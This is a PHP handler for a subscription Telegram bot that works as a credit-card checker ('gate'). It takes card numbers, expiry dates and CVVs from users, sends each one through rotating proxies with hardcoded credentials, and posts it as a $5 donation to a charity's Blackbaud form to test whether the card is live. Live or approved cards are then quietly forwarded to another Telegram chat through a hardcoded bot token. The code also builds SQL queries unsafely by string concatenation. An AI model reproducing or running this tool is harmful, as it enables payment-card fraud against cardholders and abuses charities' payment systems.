<?php
list($cmd) = explode(" ", $text);
if($cmd == "/bb" or $cmd == ".bb" or $cmd == "!bb" or $cmd == "?bb" or $cmd == "#bb" or $cmd == ":bb" or $cmd == ",bb"){ 

    if($user_id !=5606376539){
        $content = ['chat_id' => $chat_id, 'text' => "𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑶𝒇𝒇 ❌ Proxy Dead", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        SendMessage($content);
        exit();
    }

    $lista = explode(" ", $text)[1];
    $sql = "SELECT planexpiry FROM administrar WHERE id='$user_id'";
    $result = mysqli_query(mysqlcon(), $sql);
    
    $json_array = [];
    
    
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    
    $final2 = json_encode($json_array);
    
    
    $file = fopen("test.txt","w");
    echo fwrite($file,$message_id);
    fclose($file);
    
    $planexpiry = anicap($final2, '"planexpiry":"','"');
    mysqli_close(mysqlcon());
    
    
    $sql = "SELECT plan FROM administrar WHERE id='$user_id'";
    $result = mysqli_query(mysqlcon(), $sql);
    
    $json_array = [];
    
    
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    
    $final2 = json_encode($json_array);
    
    $plan = anicap($final2, '"plan":"','"');
    mysqli_close(mysqlcon());
    
    $now = time();
      if ($planexpiry < $now && $planexpiry == 0) {
    }
elseif ($planexpiry < $now && $plan != "Free User") {
    
    // Check connection
    // Attempt create database query execution
    $sql = "UPDATE `administrar` SET `plan` = 'Free User' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    // Close connection
    mysqli_close(mysqlcon());
    
    
    $sql = "UPDATE `administrar` SET `planexpiry` = '0' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    // Close connection
    mysqli_close(mysqlcon());
    $content = ['chat_id' => $chat_id, 'text' => "<b>𝒀𝒐𝒖𝒓 𝒔𝒖𝒃𝒔𝒄𝒓𝒊𝒑𝒕𝒊𝒐𝒏 𝒑𝒍𝒂𝒏 𝒊𝒔 𝒆𝒙𝒑𝒊𝒓𝒆𝒅, 𝑷𝒍𝒆𝒂𝒔𝒆 𝒄𝒐𝒏𝒕𝒂𝒄𝒕 @BossNetworkk 𝒕𝒐 𝒓𝒆𝒏𝒆𝒘</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
    $SQL = "SELECT * FROM `authorize` WHERE chats=".$chat_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $f = mysqli_num_rows($CONSULTA);
    $json_array = [];


    while ($row = mysqli_fetch_assoc($CONSULTA)) {
    $json_array[] = $row;
    }

    $final2 = json_encode($json_array);

    $chats =anicap($final2, '"chats":"','"');
    if($chats != $chat_id and $ctype == "supergroup"){
        $content = ['chat_id' => $chat_id, 'text' => "𝑻𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒊𝒔𝒏'𝒕 𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆 𝒎𝒆, 𝒄𝒐𝒏𝒕𝒂𝒄𝒕 @BossNetworkk", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit();
    }
    else{
        
       
    }
    $SQL = "SELECT * FROM `ADMINISTRAR` WHERE id=".$user_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $json_array = [];


    while ($row = mysqli_fetch_assoc($CONSULTA)) {
    $json_array[] = $row;
    }

    $final2 = json_encode($json_array);

    $plan =anicap($final2, '"plan":"','"');
    mysqli_close(mysqlcon());
    $SQL = "SELECT * FROM `ADMINISTRAR` WHERE plan=".$plan;
    if(empty($plan)){
        $content = ['chat_id' => $chat_id, 'text' => "𝑳𝒐𝒐𝒌𝒔 𝑳𝒊𝒌𝒆 𝒀𝒐𝒖 𝒉𝒂𝒗𝒆𝒏'𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒚𝒐𝒖𝒓 𝒔𝒆𝒍𝒇, 𝒅𝒐 /register 𝒕𝒐 𝒄𝒐𝒏𝒕𝒊𝒏𝒖𝒆", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    if($plan == "Free User" and $ctype == "private"){
        $content = ['chat_id' => $chat_id, 'text' => "𝒀𝒐𝒖 𝒂𝒓𝒆 𝒏𝒐𝒕 𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆 𝒎𝒆 𝒊𝒏 𝒑𝒓𝒊𝒗𝒂𝒕𝒆 𝒑𝒖𝒓𝒄𝒉𝒂𝒔𝒆 𝒑𝒓𝒆𝒎𝒊𝒖𝒎 𝒇𝒓𝒐𝒎 @BossNetworkk", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    $SQL = "SELECT * FROM `ADMINISTRAR` WHERE id=".$user_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $f = mysqli_num_rows($CONSULTA);

    if($f > 0)
    {} else{
        $content = ['chat_id' => $chat_id, 'text' => "𝑳𝒐𝒐𝒌𝒔 𝑳𝒊𝒌𝒆 𝒀𝒐𝒖 𝒉𝒂𝒗𝒆𝒏'𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒚𝒐𝒖𝒓 𝒔𝒆𝒍𝒇, 𝒅𝒐 /register 𝒕𝒐 𝒄𝒐𝒏𝒕𝒊𝒏𝒖𝒆", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit;
    }
    // if($plan == "Free User"){
    //     $content = ['chat_id' => $chat_id, 'text' => "𝒀𝒐𝒖 𝒂𝒓𝒆 𝒏𝒐𝒕 𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅 𝒑𝒖𝒓𝒄𝒉𝒂𝒔𝒆 𝒑𝒓𝒆𝒎𝒊𝒖𝒎 𝒇𝒓𝒐𝒎 @BossNetworkk", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
    //         $m1  = SendMessage($content);
    //         exit();
    // }
    // else{}
    if (empty($lista)) {
        $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒂 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
    } else {
        $CurlX = new CurlX;
        $check = strlen($lista);
        $chem = substr($lista, 0, 1);
        $vaut = array(1, 2, 7, 8, 9, 0);
        preg_match_all('/\d+/', $text, $matches);
    if (count($matches[0]) == 3) {
        $cc = $matches[0][0];
        $mes = substr($matches[0][1], 0, 2);
        $ano = substr($matches[0][1], -2);
        $cvv = $matches[0][2];
    } else if (strlen($matches[0][1]) == 3) {
        $cc = $matches[0][0];
        $ano1 = $matches[0][2];
        $ano = $matches[0][3];
        $cvv = $matches[0][1];
        $mes = $ano1;
    } else {
        $cc = $matches[0][0];
        $mes = $matches[0][1];
        $ano = $matches[0][2];
        $cvv = $matches[0][3];
    }
    $bin = substr($cc,0,6);
    $first1 = substr($cc,0,1);
    if($first1 == "4"){
        $cc_type = "5963a708-fc7f-48af-952f-16d574c4b833";
    }
    if($first1 == "5"){
        $cc_type = "b34832f7-8a95-47fa-9c43-bc8682562ea5";
    }
    if($first1 == "3"){
        $cc_type = "c4a56513-9fdb-44c5-9b19-e617f2596107";
    }
    if($mes == "01"){
        $sub_mes = "1";
    }elseif($mes == "02"){
        $sub_mes = "2";
    }elseif($mes == "03"){
        $sub_mes = "3";
    }elseif($mes == "04"){
        $sub_mes = "4";
    }elseif($mes == "05"){
        $sub_mes = "5";
    }elseif($mes == "06"){
        $sub_mes = "6";
    }elseif($mes == "07"){
        $sub_mes = "7";
    }elseif($mes == "08"){
        $sub_mes = "8";
    }elseif($mes == "09"){
        $sub_mes = "9";
    }elseif($mes == "10"){
        $sub_mes = "10";
    }elseif($mes == "11"){
        $sub_mes = "11";
    }elseif($mes == "12"){
        $sub_mes = "12";
    }
    //        'ihojryep-rotate:a75v25f6afx1',
    //"psyohwld-rotate:hdxu4zfaz5ip",
    $rotate = array(
        'U99pbU:yM0wAf',
        'oCqNRH:i18i58',
        'PfO6EN:3j04W4',
        'oXGn5O:E3lj3G',
        'lr9wwO:x33pVi',
        '2jCHw9:KzDDgy',
        'UbFFce:3Ftrj2',
        'K5VKJa:8zdAZT',
        'f951hv:k0YRer',
        '1pYsMR:TonSB4',
        'A7t28n:XEDwsb',

        );
        
        $user_pass = $rotate[array_rand($rotate)];
    //         "AUTH"   => "unoehbda-rotate:2bxs8q2xfbks"
    $server = [
        "METHOD" => "CUSTOM",
        "SERVER" => "hub-us-7.litport.net:31337",
        "AUTH"   => "$user_pass"
    ];
    // $rotate = array(
    //     'klykayds-rotate:s2qiz3ovb8zg',
    //     'hetntfrr-rotate:dwl5uaw9dfts'
    // );
    // $webpass = $rotate[array_rand($rotate)];
    // $server =[
    //     "METHOD" => "CUSTOM",
    //     "SERVER" => "p.webshare.io",
    //     "AUTH" => "$user_pass"
    // ];

        if (in_array($chem, $vaut)) {
            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        } elseif ($check < 15) {
            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        }
        if (strlen($ano) == 2) {
            $ano = "20" . $ano;
        }
        $SQL = "SELECT * FROM `ADMINISTRAR` WHERE id=".$user_id;
        $c = mysqli_query(mysqlcon(),$SQL);
        $time = 30;
        $RAW = mysqli_fetch_assoc($c);
        $ANTISPAM = $RAW['antispam'];
        $Rango = $RAW['rango'];
        $TIMEAC = time() - $ANTISPAM;
        if($TIMEAC < 30)
        {
            $TotalTime = $time - $TIMEAC;
            if($plan !== "Free User"){

            }elseif($TotalTime > 0){
            $content = ['chat_id' => $chat_id, 'text' => "<b>┏━━━━━━━━━━━━━━\n┣ 🍁 𝑨𝒏𝒕𝒊𝒔𝒑𝒂𝒎 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑨𝒏𝒕𝒊𝒔𝒑𝒂𝒎 : <code><i>$TotalTime</i></code>s\n══════════════════════</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit;
            }
        }
     //   if($bin == "440393" or $bin == "375890"){
            $che = bannedbin($bin);
            if($che == true){
                    $content = ['chat_id' => $chat_id, 'text' => "<b>Bin Blocked leccher</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
                    $m1  = SendMessage($content);
                    exit();
            }
        $timest = time();
        $SQL = "UPDATE ADMINISTRAR SET antispam = '$timest' WHERE id=".$user_id;
        $CONSULTA = mysqli_query(mysqlcon(),$SQL);
        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕...</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        $m1i = $m1['result']['message_id'];
        

        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■□□□□</b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
        $m2  = EditMessageText($content);
        $m2i = $m2['result']['message_id'];

        /*----------  R2 CAPTCHA  ----------*/
        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■■■□□</b>", 'message_id' => $m2i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($content);
        $m3i = $m3['result']['message_id'];
        $cctwo = substr("$cc", 0, 6);
        $curl = curl_init();
        curl_setopt_array($curl, [
        CURLOPT_URL => "https://bins-su-ani.vercel.app/api/".$bin,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_ENCODING => "",
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => "GET",
        CURLOPT_HTTPHEADER => [
        "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
        "sec-fetch-dest: document",
        "sec-fetch-site: none",
        "user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
        ],
        ]);
        
        $result = curl_exec($curl);
        curl_close($curl);
        $data = json_decode($result, true);
        $bank = $data['data']['bank'];
        $country = $data['data']['country'];
        $brand = $data['data']['vendor'];
        $level = $data['data']['level'];
        $type = $data['data']['type'];
        $flag = $data['data']['countryInfo']['emoji'];
        $result1 = $data['result'];
        
        

        /*----------  R2 STRIPE  ----------*/
$cookie = uniqid();
        $headers = array(
            'authority: www.brooklynbrigade.us',
            'accept: */*',
            'accept-language: en-US,en;q=0.9',
            'content-type: application/json',
            'newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjMyNjA0ODEiLCJhcCI6IjU2MTMwMzcwMSIsImlkIjoiNDRlZDNjYWI2NzQ4MjVjMiIsInRyIjoiNjc3YmMxNjA3YjkxOWFjZTUyMTU2N2U4OTQxNGQ2YTUiLCJ0aSI6MTY1MzkzMjg1MDk1OH19',
            'origin: https://www.brooklynbrigade.us',
            'referer: https://www.brooklynbrigade.us/checkout/',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'traceparent: 00-677bc1607b919ace521567e89414d6a5-44ed3cab674825c2-01',
            'tracestate: 3260481@nr=0-1-3260481-561303701-44ed3cab674825c2----1653932850958',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36',
            'x-newrelic-id: VwQBUVJbCRAFUlBRBwIFX1Y=',
            'x-requested-with: XMLHttpRequest',
        );
        
        $r4 = $CurlX::Post("https://bbox.blackbaudhosting.com/webforms/components/custom.ashx?handler=blackbaud.appfx.mongo.parts.postformhandler", 'bboxdonation%24gift%24GivingLevel=rdGivingLevel4&bboxdonation%24gift%24txtAmountOther=%245.00&bboxdonation%24gift%24txtAmountPledge=&bboxdonation%24gift%24hdnGivingLevelButtonsEnabled=false&bboxdonation%24gift%24hdnPledgeDuration=&bboxdonation%24gift%24hdnPledgePayment=&bboxdonation%24gift%24hdnGiftButtonsStyle=&bboxdonation%24designation%24ddDesignations=3&bboxdonation%24designation%24txtOtherDesignation=&bboxdonation%24comment%24txtComments=&bboxdonation%24recurrence%24ddFrequency=2&bboxdonation%24recurrence%24ddFrequencyDate=15&bboxdonation%24recurrence%24hdnRecurringOnly=&bboxdonation%24recurrence%24hdnDateOptions=%5B%7B%22frequency%22%3A2%2C%22values%22%3A%2215%22%2C%22paymentDates%22%3A%226%2F15%2F2022%22%7D%5D&bboxdonation%24recurrence%24hdnRecurringOptionValue=15&bboxdonation%24payment%24txtCardholder=jhon+smkhj&bboxdonation%24payment%24txtCardNumber='.$cc.'&bboxdonation%24payment%24cboCardType='.$cc_type.'&bboxdonation%24payment%24cboMonth='.$sub_mes.'&bboxdonation%24payment%24cboYear='.$ano.'&bboxdonation%24payment%24txtCSC='.$cvv.'&bboxdonation%24payment%24hdnMerchantAccountId=ffaac860-e3fc-430a-9bfe-1265ec160251&bboxdonation%24billing%24txtOrgName=&bboxdonation%24billing%24txtFirstName=jhon&bboxdonation%24billing%24txtLastName=ohio&bboxdonation%24billing%24txtEmail=aircracker2021%40hotmail.com&bboxdonation%24billing%24txtPhone=9428377837&bboxdonation%24billing%24billingAddress%24ddCountry=United+States&bboxdonation%24billing%24billingAddress%24txtAddress=214+East+Camelback+Road&bboxdonation%24billing%24billingAddress%24txtCity=Phoenix&bboxdonation%24billing%24billingAddress%24ddState=WA&bboxdonation%24billing%24billingAddress%24txtZip=85012&bboxdonation%24billing%24billingAddress%24txtUKCity=Phoenix&bboxdonation%24billing%24billingAddress%24ddUKCounty=&bboxdonation%24billing%24billingAddress%24txtUKPostCode=85012&bboxdonation%24billing%24billingAddress%24txtCACity=Phoenix&bboxdonation%24billing%24billingAddress%24ddCAProvince=WA&bboxdonation%24billing%24billingAddress%24txtCAPostCode=85012&bboxdonation%24billing%24billingAddress%24txtAUCity=Phoenix&bboxdonation%24billing%24billingAddress%24ddAUState=WA&bboxdonation%24billing%24billingAddress%24txtAUPostCode=85012&bboxdonation%24billing%24billingAddress%24ddNZSuburb=&bboxdonation%24billing%24billingAddress%24ddNZCity=&bboxdonation%24billing%24billingAddress%24txtNZPostCode=85012&bboxdonation%24hdnJsonFieldProps=&bboxdonation%24hdnMongoInstanceID=&bboxdonation%24hdnMetaTag=1&bboxdonation%24hdnEmailInfo=%7B%7D&bboxdonation%24hdnHideDirectDebitForOneTimeGift=&bboxdonation%24hdnDateTimeOffset=330&bboxdonation%24hdnReCAPTCHASettings=%7B%22isEnabled%22%3Afalse%7D&bboxdonation%24hdnMixpanelToken=&bboxdonation%24hdnBBCheckoutPublicKey=&bboxdonation%24hdnBBCheckoutTransactionID=&bboxdonation%24hdnBBCheckoutCardToken=&bboxdonation%24hdnBBCheckoutProcessNow=&bboxdonation%24hdnSecurePaymentClicked=false&bboxdonation%24hdnBBCheckoutAmount=&bboxdonation%24hdnBBShowDirectDebitConfirmationBox=0&bboxdonation%24hdnDonorCoverEnabled=0&bboxdonation%24hdnAuthorizedAmount=0&bboxdonation%24hdnDonorCoveredAmount=0&bboxdonation%24hdnDonorCovered=0&instanceId=e769f78a-87d0-4df7-9034-12607878ff3f&partId=7d7a67ce-377c-4600-bc14-57c70b30c7e1&srcUrl=https%3A%2F%2Fwww.sacredheartmission.org%2Fdonate%2F&bboxdonation$btnSubmit=Donate,"email":"aircracker2021@hotmail.com"}', ['Accept: */*','Accept-Language: en-US,en;q=0.9','Content-Type: application/x-www-form-urlencoded; charset=UTF-8','Host: bbox.blackbaudhosting.com','Origin: https://bbox.blackbaudhosting.com','Referer: https://bbox.blackbaudhosting.com/webforms/custom/mongo/scripts/MongoServer.html?xdm_e=https%3A%2F%2Fwww.sacredheartmission.org&xdm_c=default7517&xdm_p=1','Sec-Fetch-Dest: empty','Sec-Fetch-Mode: cors','Sec-Fetch-Site: same-origin','user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'','X-Requested-With: XMLHttpRequest',],$cookie,$server)->body;

        $msg = getData($r4,'<div id="divError" class="BBFormErrorBlock"><div class="BBFormErrorItem BBFormServerErrorItem">','</div>');
        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■■■■■ </b>", 'message_id' => $m3i, 'parse_mode' => 'html'];
        $m4  = EditMessageText($content);
        $m4i = $m4['result']['message_id'];

        if (strpos($r4, 'thank you for your generous support of people experiencing homelessness and social disadvantage')) {
            $cc_code = 'Charged 5$ ✅';
            $msg = "Thank You for your generous support";
            $full = "BLACKBAUD\nCC == <code>$cc|$mes|$ano|$cvv</code>\nRES = $cc_code\nREZPONSE- $msg";
        $url = "https://api.telegram.org/bot5579015618:AAEnGaXH73gQ0wn7kjrdsskESUr8FmRgGSw/sendMessage?chat_id=-1001722364754&text=".$full."&parse_mode=HTML";
         
        file_get_contents($url);
        } elseif (strpos($r4, 'Insufficient Funds')) {
            $cc_code = 'Approved ✅';
            $full = "BLACKBAUD\nCC == <code>$cc|$mes|$ano|$cvv</code>\nRES = $cc_code\nREZPONSE- $msg";
        $url = "https://api.telegram.org/bot5579015618:AAEnGaXH73gQ0wn7kjrdsskESUr8FmRgGSw/sendMessage?chat_id=-1001722364754&text=".$full."&parse_mode=HTML";
         
        file_get_contents($url);
         file_get_contents($url);
        } elseif(strpos($r4,"We've run into a slight problem")){
            $cc_code = "Card Not Supported 🖕";
            $msg = "Sorry discover isn't support ";
        }elseif(strpos($r4,"Card Issuer")){
            $cc_code = "Approved ✅";
            $msg = "Incorrect CVV";
            $full = "BLACKBAUD\nCC == <code>$cc|$mes|$ano|$cvv</code>\nRES = $cc_code\nREZPONSE- $msg";
        $url = "https://api.telegram.org/bot5579015618:AAEnGaXH73gQ0wn7kjrdsskESUr8FmRgGSw/sendMessage?chat_id=-1001722364754&text=".$full."&parse_mode=HTML";
         
        file_get_contents($url);
        }else {
            $cc_code = 'Declined ❌';
        }
        
        if (empty($r4)) {
            $content = ['chat_id' => $chat_id, 'text' => "<b>┏━━━━━━━━━━━━━━\n┣ 🍁 𝑩𝒍𝒂𝒄𝒌𝑩𝒂𝒖𝒅 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑮𝑨𝑻𝑬 : <code>𝑩𝒍𝒂𝒄𝒌𝑩𝒂𝒖𝒅 𝑪𝒉𝒂𝒓𝒈𝒆</code>\n[ϟ] 𝑪𝒂𝒓𝒅 : <code>$cc|$mes|$ano|$cvv</code>\n[ϟ] 𝑹𝒆𝒔𝒖𝒍𝒕 : <code>Unknown error</code>\n┏━━━━━━━━━━━━━━\n┣ 🍁 𝑩𝑰𝑵 𝑫𝑨𝑻𝑨 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑩𝒊𝒏 𝑫𝒆𝒕𝒂𝒊𝒍𝒔: $bin - $type - $brand - $level\n[ϟ] 𝑩𝒂𝒏𝒌: $bank\n[ϟ] 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: $country - $flag\n_𝑩𝒚: @$username [$plan]\n══════════════════════</b>", 'message_id' => $m4i, 'parse_mode' => 'html'];
            $m3  = EditMessageText($content);
            exit();
        }

        $content = ['chat_id' => $chat_id, 'text' => "<b>┏━━━━━━━━━━━━━━\n┣ 🍁 𝑩𝒍𝒂𝒄𝒌𝑩𝒂𝒖𝒅 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑮𝑨𝑻𝑬 : <code>𝑩𝒍𝒂𝒄𝒌𝑩𝒂𝒖𝒅 𝑪𝒉𝒂𝒓𝒈𝒆</code>\n[ϟ] 𝑪𝒂𝒓𝒅 : <code>$cc|$mes|$ano|$cvv</code>\n[ϟ] 𝑹𝒆𝒔𝒖𝒍𝒕 : <code>$cc_code</code>\n[ϟ] 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 : <b>$msg</b>\n┏━━━━━━━━━━━━━━\n┣ 🍁 𝑩𝑰𝑵 𝑫𝑨𝑻𝑨 🍁\n┗━━━━━━━━━━━━━━\n[ϟ] 𝑩𝒊𝒏 𝑫𝒆𝒕𝒂𝒊𝒍𝒔: $bin - $type - $brand - $level\n[ϟ] 𝑩𝒂𝒏𝒌: $bank\n[ϟ] 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: $country - $flag\n[ϟ] 𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚: @$username [$plan]\n[ϟ] 𝑩𝒐𝒕 𝑩𝒚 : <code>@BossNetworkk</code>\n══════════════════════</b>", 'message_id' => $m4i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($content);
    }
}
